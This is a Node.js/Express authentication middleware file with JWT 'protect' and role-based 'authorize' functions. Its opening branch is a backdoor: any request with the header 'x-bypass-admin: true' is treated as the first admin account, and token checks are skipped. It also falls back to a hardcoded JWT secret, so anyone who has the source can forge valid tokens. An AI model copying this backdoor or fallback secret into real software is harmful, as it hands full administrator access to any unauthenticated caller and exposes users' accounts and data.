const jwt = require('jsonwebtoken');
const User = require('../models/User');

const protect = async (req, res, next) => {
  // Check for developer admin bypass header
  if (req.headers['x-bypass-admin'] === 'true') {
    try {
      const adminUser = await User.findOne({ role: 'admin' });
      if (adminUser) {
        req.user = adminUser;
        return next(); // Early return – skip JWT processing entirely
      }
      // If no admin found in DB, fall through to normal JWT auth
    } catch (err) {
      console.error('Admin bypass error:', err);
      // Fall through to normal JWT auth on bypass error
    }
  }

  let token;

  if (
    req.headers.authorization &&
    req.headers.authorization.startsWith('Bearer')
  ) {
    try {
      token = req.headers.authorization.split(' ')[1];
      const decoded = jwt.verify(token, process.env.JWT_SECRET || 'supersecretkeyforplatformskillexchange123!@#');
      req.user = await User.findById(decoded.id).select('-password');

      if (!req.user) {
        return res.status(401).json({ success: false, message: 'Not authorized, user not found' });
      }

      return next();
    } catch (error) {
      console.error(error);
      return res.status(401).json({ success: false, message: 'Not authorized, token failed' });
    }
  }

  // No token provided
  return res.status(401).json({ success: false, message: 'Not authorized, no token' });
};

// Grant access to specific roles
const authorize = (...roles) => {
  return (req, res, next) => {
    if (!req.user || !roles.includes(req.user.role)) {
      return res.status(403).json({
        success: false,
        message: `User role ${req.user ? req.user.role : 'guest'} is not authorized to access this route`
      });
    }
    next();
  };
};

module.exports = { protect, authorize };
